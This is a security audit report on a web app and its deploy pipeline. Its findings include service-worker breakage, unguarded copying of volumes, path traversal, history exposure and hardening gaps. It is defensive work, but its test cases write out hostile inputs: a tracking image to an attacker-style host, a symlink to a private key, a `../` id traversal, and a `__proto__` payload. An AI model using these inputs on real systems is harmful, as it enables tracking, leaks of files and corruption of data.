# 030 V · the outside eye — security review of `yan-c` @ 01c39258 (findings only)

**Verdict:** the app's own parsers, sanitizer, link codec, service worker and CSP hold; nothing untrusted the browser reads was found to reach script execution. The two things that fail are outside `lab/`: the live site's HTML is being rewritten by Cloudflare so the service worker never installs, and the deploy build copies a shelf volume into `dist/` without the guards the rest of the tree gets.

---

## Findings, most severe first

### 1 · high · live site + `lab/sw.js:124,556-560` — Cloudflare injects an inline `<script>` into every HTML response; the CSP blocks it on every load and the service worker's install hash check fails permanently
- Defect: the zone's Bot Fight Mode / JavaScript Detections appends `<script>(function(){… window.__CF$cv$params … /cdn-cgi/challenge-platform/scripts/jsd/main.js …})()</script>` before `</body>`. The CSP is `script-src 'self'` with no nonce, so the browser blocks it silently (no `report-to` for the policy), and the body's SHA-256 no longer begins with the recorded `feb9d19e1f72`.
- Scenario: `sw.js` §3 fetches `/index.html?__rev=feb9d19e1f72`, digests it, gets a different prefix every time (the ray id changes), throws `precache ./index.html → bytes …`, and the browser discards the worker. Every visitor runs with no offline copy, no build pinning and no update offer; `sw-client` never leaves `registered`. The build's §V checks run on `dist/`, not the origin, so the pipeline cannot see it.
- CONFIRMED: `curl https://lambdawaves.magic-commons.com/index.html?__rev=x` → 19,310 bytes, sha prefix `224f1803b0b3` (curl UA) and `bcfc752b114c` (Chrome UA); `lab/index.html` in the checkout hashes to `feb9d19e1f72`; `diff` is exactly the one injected line 162. `/main.js` and `/sw.js` live are byte-identical to the checkout, so only HTML is rewritten. The node harness over the real `sw.js` rejects an install whose body hash differs (same code path).
- Direction: disable JavaScript Detections for this hostname (or the zone); add a post-deploy probe of `/index.html?__rev=<rev>` against the recorded hash; give the CSP a `report-to` so a blocked script is seen.

### 2 · high · `tools/build-deploy.mjs:236` — `--ship` copies the shelf volume's directory into `dist/volumes/<id>/` verbatim, with none of the public-tree guards `lab/` gets
- Defect: `cpSync(path.join(srcDir, v.id), …, { recursive: true })` copies symlinks as symlinks and takes dotfiles, `.git/`, `node_modules/`, `*.pem` and private-key bodies; `assertPublicTree()` (line 183) runs on `LAB` only, and §V1 accepts anything under `volumes/` because it is a `sw.js` DATA root. Wrangler's asset manifest walks with `readdir(recursive)` + `stat`, so a symlink is read through and uploaded as a file.
- Scenario: a stray symlink, `.env` or key in `~/Documents/LAMBDAWAVES-VOLUMES/dist/vol-1/` (a 13,855-file directory maintained by scripts) is published world-readable at `lambdawaves.magic-commons.com/volumes/vol-1/…`.
- CONFIRMED (scratch copy of the repo, hostile shelf fixture): a `vol-1/` holding `leak.json → ../id_rsa`, `.env`, `.git/config`, `node_modules/x.js`, `key.pem` built with exit 0 ("dist/ is complete and verified — 1747 files") and `wrangler deploy --dry-run` listed each of them as an asset. The actual upload of the symlink target's bytes is PLAUSIBLE (not deployed).
- Direction: copy only what the volume's `index.json` names (`index.json`, `m/<id>.lwm`, `t/<id>*.webp`), or run `assertPublicTree()` on `srcDir/<id>` with no `devLinks` before the copy, with `lstat`.

### 3 · medium · `tools/build-deploy.mjs:228,236,239` — a shelf entry's `id` is unsanitised: `..` or `/` reads outside the shelf directory, writes outside `dist/`, and is written into the shipped `volumes.json`
- Scenario: a shelf with `id: "../../escape"` and `--ship ../../escape`. The operator must name the id on `--ship`, so this needs a tampered shelf plus a pasted id; the app side is safe (`lab/volumes.js:45 SAFE` drops the entry).
- CONFIRMED: the build read `<scratch>/escape/index.json` and wrote `<repo>/escape/index.json`, outside `dist/`, exit 0.
- Direction: apply `lab/volumes.js`'s `SAFE` and `RELATIVE` to `v.id`, `v.index` and `archive.name`, and `path.resolve`-check that the destination stays under `DIST`.

### 4 · medium · `tools/build-deploy.mjs:227-233` — shelf entries are not validated beyond presence, and no hash is compared to what is copied
- Defect: `index` may be any string (an `https://evil.example/x.json` was accepted and shipped), `indexSha256`, `archive.sha256` and `archive.bytes` are never checked against the files, `numeral`/`title` are untyped.
- Scenario: a stale or corrupt packer output ships a shelf whose hashes do not match the volume on the site; every INSTALL then fails at `volumes.js:113` ("does not match its shelf entry"), and the single-molecule road (`volumes.js:316-325`) serves whatever file is there, since it checks only the catalogue's own sha.
- CONFIRMED: `indexSha256: "not-a-hash"`, `archive.bytes: "x"` and an `https://` index passed, exit 0.
- Direction: recompute the sha-256 of each shipped `index.json` and compare to `indexSha256`; validate the shelf with the app's regexes; check hex shape and `typeof bytes === 'number'` on archive entries.

### 5 · medium · history: `.claude/handoffs/latest.md` (291 KB, 163 revisions) and `.claude/handoffs/agents/*.md`, reachable from `main` and `dev` and in the tag `research-archive-2026-10-30` — agent hand-off logs of the maintainer's whole local environment
- Defect: the real Linux username and home directory (120+ hits), worktree, job, npm-cache and conda paths, installed tool paths, pids, LAN ports (8711/8721/8773, 5273), and an incident note that the LAN gate server on `0.0.0.0:8711` served the worktree, including `.certs/key.pem`, to the Wi-Fi for 18 h (commit 3efbd289's blob, line 317). The key itself is not in git (`.certs/` and `*.pem` are ignored).
- Scenario: targeted reconnaissance of the maintainer's machine and tooling; the note tells an attacker a self-signed TLS key was once exposed on a LAN.
- CONFIRMED: blob grep over every text blob of every ref; `git merge-base --is-ancestor` puts the commits on `origin/main` and `origin/dev`. The files were deleted from the tree at 0aa15bd5 ("029 THE ARCHIVE") but `.claude/handoffs/` is not gitignored.
- Direction: gitignore `.claude/handoffs/`; decide whether to rewrite `main`/`dev` and re-cut the tag, or accept the exposure.

### 6 · low · `lab/mir/shell/notebook-render.js:8-10,22` with `lab/shell/notebook.js:290` and the CSP `img-src … https:` (`tools/build-deploy.mjs:333`) — a shared project's notebook can beacon any https host when it opens
- Scenario: `notebook.text` carries `![](https://attacker.example/p.png?victim)`. `opened()` shows the notes in view mode and renders them, so the reader's browser fetches the attacker's URL on open: IP, time, user agent, and the origin as referrer (`strict-origin-when-cross-origin`). `SECURITY.md` documents the trade-off; listed because the fetch is automatic, not on a click.
- CONFIRMED: the sanitizer keeps `<img src="https://example.invalid/pixel.png?victim">` and Chromium attempted the fetch on insertion (`ERR_NAME_NOT_RESOLVED`); the live CSP permits it.
- Direction: either `img-src 'self' blob: data:` at the edge (remote images in notes are lost), or restrict `IMG src` to same-origin and `data:` in `nbSafeURL`.

### 7 · low · `lab/shell/persist.js:299` with `lab/particles.js:51` — a project's `overlays.particles.count` is unbounded and `seed()` samples synchronously until it has that many points
- Scenario: `data.presentation.overlays.particles = { on: true, count: 1000000 }` (no `instruments.particles.count`) → `particles.seed(1000000, …)` loops up to `count × 4000` rejection samples on the main thread; the tab is frozen for minutes and the roll-back cannot run until it ends. The knob's clamp applies to the UI only.
- CONFIRMED (scaling, node): `createParticles()` with a one-mode register — `seed(160)` 48 ms, `seed(20000)` 3,381 ms, linear.
- Direction: clamp `count` to the knob's ceiling at the restore.

### 8 · low · `lab/volumes-format.js:125-129` with `lab/volumes.js:227-244` — a `.lwv` index may name the same path twice (`index.json` included) and any name under the volume folder
- Scenario: a crafted LAMBDAWAVES-VOL-I.lwv carries the real `index.json` first (its sha equals the public `indexSha256`), then a second `index.json` with other bytes and a self-consistent sha. `installFile` writes both to the same cache key, the second last. Every read re-hashes against the shelf, so no forged catalogue is used; the installed volume reads "not on this device" until reinstalled from a good file. Arbitrary names (`evil.html`) land as inert entries in `lw-vol-<id>` that `sw.js` never serves (it opens only its own two caches).
- CONFIRMED at the parser (node): `parseLwv` accepted `['index.json','index.json']`, `['index.json','m/a.lwm','m/a.lwm']`, `['index.json','evil.html','m/a.webp']`; `..`, a leading `/`, a scheme and `//host` are refused. The install consequence is PLAUSIBLE (no Cache Storage in node).
- Direction: refuse a duplicate path, and refuse any path the catalogue does not name.

### 9 · low · `lab/sw.js:622-624,479` with `lab/library.js:148-152` — the DATA cache `lw-data-v1` is served to any same-origin non-navigation GET with no check, and most of it is never swept
- Scenario: one same-origin script execution (none found) puts `/demos/<file>.lambdawaves.json` or `/vendor/bse/*.json` into `lw-data-v1`; the worker answers the app's own fetches from it on every later boot, across builds. Impact is data (project and notebook content, basis records), not code: the DATA arm never answers a navigation or a script import. `SWEEP` covers only `img/menu/`, `demos/covers/`, `vendor/nist/`; only `library/<sha>.json` is re-hashed on read.
- CONFIRMED mechanism (node harness over the real `sw.js`): after `put('/library/pwned.js', …)`, `GET /library/pwned.js?x=1` is served from `lw-data-v1` and survives activate; a navigation to it passes through.
- Direction: serve a DATA entry only when its stored response carries the `x-lw-sha256` marker (or a JSON/image type), and sweep `demos/` and `vendor/bse/` whole.

### 10 · low · `lab/sw.js:649-651,668-674` — `LW_SW_SKIP_WAITING { force }` is honoured from any same-origin client, with no `event.source` check and a truthy `force`
- Scenario: a same-origin document (again needing XSS) posts it to a waiting worker; every other window loses its build's cache mid-session (`activate` deletes the old `lw-lab-*`). No cross-origin path exists.
- CONFIRMED (node): five windows, `force: 1`, `event.source = null` → `skipWaiting` called. `clients.claim()` is never called.
- Direction: hardening only — require a window client as `event.source`.

### 11 · low · live headers — no `Strict-Transport-Security` on any response; the apex sends none either
- Scenario: http → https is a 301, but each fresh visit's plain-http request is interceptable, and the PWA's origin (projects in localStorage, volumes in Cache Storage) is one downgrade away.
- CONFIRMED by header capture (`/`, `/index.html`, `/sw.js`, `/manifest.webmanifest`, 404s).
- Direction: `Strict-Transport-Security: max-age=31536000; includeSubDomains`, at the zone or in `_headers` (`tools/build-deploy.mjs:329-337`).

### 12 · low · `SECURITY.md:33-35` — the disclosure channel is public or absent
- Scenario: the file points at a GitHub issue "marked security" (public) or "the address on magic-commons.com"; `https://magic-commons.com` 302s to `/joshs-library/lambdawaves/`, which carries no address. Private vulnerability reporting status is not observable (403).
- CONFIRMED (curl + grep).
- Direction: enable GitHub private vulnerability reporting and name a real address.

### 13 · low · GitHub — `dev` and `yan-c` are unprotected; `main`'s protection is only partly observable; no CODEOWNERS, no Dependabot
- CONFIRMED by API: `main` protected, required checks `node` and `node-and-build` enforced for everyone; `dev` `protected: false`; `GET /branches/main/protection` and `/rulesets` → 403 / `[]`, so required reviews, force-push and admin bypass are unknown. `security_and_analysis` is null (not observable).
- Direction: protect `dev`; add `dependabot.yml` for the one devDependency and the two actions.

### 14 · low · `.github/workflows/verify.yml:17,22` — a pull request's lockfile chooses the code `npx --no-install wrangler deploy --dry-run` runs
- Scenario: a fork PR swaps wrangler's resolved tarball and integrity in `package-lock.json`; `npm ci --ignore-scripts` installs it and the dry-run executes it. The job has `permissions: contents: read`, `persist-credentials: false` and no secrets, so the gain is CI compute and cache poisoning.
- PLAUSIBLE (by reading; not executed).
- Direction: keep the zero-secret posture; diff the lockfile's resolved registries in CI.

### 15 · low · `.github/workflows/gate.yml:12` — `actions/checkout` without `persist-credentials: false`
- The token is read-only, so it matters only if a step is added. CONFIRMED by reading. Direction: mirror `verify.yml:11`.

### 16 · low · `lab/volumes-format.js:37` — a `.lwm` blob descriptor may carry a negative `offset`, and `rungs` may be a non-object
- Scenario: `offset: -8` passes (`Number.isInteger`, `% 8 === 0`, `end ≤ length`), so a blob aliases the header's bytes; a larger negative offset makes `subarray` count from the end and the typed-array constructor throw inside the open. A `.lwm` reaches `parseLwm` only after its sha matches the site's catalogue, so this needs a published file.
- CONFIRMED (node): a `Float64Array` read out of the header for `offset: -8`; `rungs: "oops"` → TypeError in `rungs()`; `length: 2**40` is refused.
- Direction: `b.offset >= 0`; `isObj(header.rungs)`.

### 17 · low · `lab/shell/persist.js:24,200` — a project's `presentation.obs` may carry `"__proto__"`, and `Object.assign(obs, finiteOver(…))` re-parents the camera object
- Scenario: `{"obs":{"dist":4,"__proto__":{"lock":true}}}`; `finiteOver` spreads the key as an own property and `Object.assign` [[Set]]s it, so `obs` inherits the file's object; any key `obs` lacks later reads from the file. `Object.prototype` is untouched, and every other `load()` read copies by a DEFAULTS allowlist.
- CONFIRMED (node): `Object.getPrototypeOf(obs) !== Object.prototype`, `obs.evil === 1`, `({}).evil === undefined`.
- Direction: copy `obs` by an allowlist, or drop `__proto__`/`constructor`/`prototype` in `finiteOver`.

### 18 · low · history and the tag — vault layout, a second personal e-mail, and two third-party screenshots
- (a) 50+ distinct paths under `~/Documents/OBSIDIAN/…` and `~/Documents/DATABASE/…` beyond the `DATABASE/CLAUDE/…` citations CLAUDE.md makes on purpose (handoffs, `research/*.md`, `docs/history`), naming unpublished projects and a second handle. (b) Four commits (84f9a9ab, 601aae99, 2a03c067, 28fe4457) carry a second personal Gmail address as author; every commit and tag carries the maintainer's. (c) `research/iteration-011/josh-reference-gunnardraft-post.png` and `…-table.png` in the tag reproduce a third party's Reddit post, Shadertoy source under a "confidencial … autorización expresa" header, and app UI, with their handle.
- CONFIRMED (blob grep; `git log --format=%ae`; images viewed).
- Direction: alias vault paths in future notes; a noreply author address; drop the two reference screenshots from any future archive tag.

### 19 · low · `tools/build-deploy.mjs:723-727` §V7 — the budget is right, but `walk()` counts a symlink to a directory as one file
- The units (25 × 1024² per file), the count over `walk(DIST)` including shipped volumes, the hard `fail` and the `>` at 20,001 are correct (run: 1739 files baseline, 1747 with the fixture). A directory symlink inside a volume is one "file" to `walk` and a subtree to wrangler's `readdir(recursive)`, so the count can understate. PLAUSIBLE by reading; covered by finding 2's guard. `_headers`/`_redirects` are counted though wrangler ignores them (conservative by 2).

### Informational
- No `Permissions-Policy`, no `Cross-Origin-Resource-Policy`, no CSP `report-to`, no Trusted Types. With ~80 `innerHTML` sites, `require-trusted-types-for 'script'` plus a default policy is the largest DOM-XSS hardening available; COOP/COEP absence is deliberate (no SharedArrayBuffer).
- Cloudflare adds `nel` / `report-to` to `a.nel.cloudflare.com` on every response, which `SECURITY.md`'s "no analytics" does not mention.
- `tools/build-deploy.mjs:779-780` prints the `git check-ignore` NOTE in any non-git copy (cosmetic).

## Nothing found, by surface
- **Project import** (`lab/project-store.js parseProjectFile`, `lab/projects.js take`): 8 MiB cap before parse; `thumb` admitted only as `data:image/`; names and status go through `textContent`; `path`/`name` never become selectors or URLs.
- **Notebook sanitizer** (`lab/mir/shell/notebook-render.js`): held against 23 vectors in Chromium — event handlers, `javascript:`/`data:` with and without tab smuggling, svg/math/noscript/form mXSS, template reparse, `srcdoc`, attribute smuggling, KaTeX 0.16.11 `\href`/`\url`/`\htmlData`/`\includegraphics`/`\htmlStyle` under `trust: false`, a macro bomb (5 ms), a 100,000 em rule, 200 kB of `<` (216 ms); maths is expanded in text nodes only. marked 12.0.2.
- **`lw:` links**: `statelink.js decodeState` is bounded (every count checked against 91/140), CRC-32 checked, every string escaped before `innerHTML` (`shell/links.js esc`, `history.js`); the notebook's `lw:` verbs are an allowlist of five and run on a click only; `?preset=`, `?view=`, `?starter=` are allowlisted; `ASK_ENABLED` is false and `connect-src 'self'` would block its POST anyway.
- **`.mir` / PNG / ZIP intake** (`lab/mir/core/{png,zip,envelope}.js`): every length bounded by the buffer, every CRC checked, stored-only ZIPs, asset ids hashed, names matched never used as paths.
- **Service worker fetch road**: same-origin only (`sw.js:617`); nothing written at runtime; opaque, redirected and non-ok responses never cached; navigation fallback only for `/` and `/index.html`; `Range`/`HEAD`/`POST` pass through; live `/sw.js` byte-identical to the checkout.
- **CSP vs. the app**: nothing the app does violates the live policy — workers, `fetch`, dynamic `import()` and `createElement('script')` targets are all same-origin; `blob:` only for `<img>`/`<video>`/downloads; no eval, `new Function`, string timers, WebAssembly, `postMessage('*')` or remote fonts. The one inline `<style>@layer app, mir;</style>` is covered by `style-src 'unsafe-inline'`, which KaTeX output needs.
- **Secrets**: none in 12,436 blobs across 2,181 commits and 47 tags (AWS, GitHub, Slack, Anthropic, Google, GitLab, npm, JWT, PEM, Cloudflare ids and tokens, Authorization/cookie literals; `git log -S` on the Cloudflare names → 0). `media/star.mp3` never existed in any ref or in the tag's tree; no audio or video file anywhere in history; `/media/` is gitignored. Fonts are OFL with SOURCE and NOTICE coverage.
- **Workflows**: both actions pinned to full SHAs resolving to v4.4.0; `on: [push, pull_request]` with no `pull_request_target`; `permissions: contents: read`; no secrets; no `${{ github.event.* }}` in a `run:`; `.npmrc` `ignore-scripts=true`.
- **Deploy build, the `lab/` half**: `smoke.html` dropped; no tests, tools, research, `.git`, `node_modules` or dotfiles enter `dist/`; §V1 re-hashes every precache entry so a stale `sw.js` cannot ship.

## Not reviewed, and why
- WebGPU, the field, the shaders and anything that draws: the sandbox has no GPU, and the brief excluded it. The WGSL is fixed source (`lab/node-shader.js`), not project-authored.
- `installFile` end to end against Cache Storage, and the actual bytes wrangler would upload for a symlink: no browser Cache API in node and no deploy was run; both are marked PLAUSIBLE where they rest on reading.
- `main`'s required reviews, force-push and admin-bypass settings, secret-scanning and private-vulnerability-reporting status: the API returns 403 to this integration.
- The modulation model's `deserialize`, the NODES graph compiler and the kit's FOLDERS gallery internals beyond the intake: read for sinks (none) but not fuzzed.
- `tools/platform/android-webview/`: out of the shipped site.
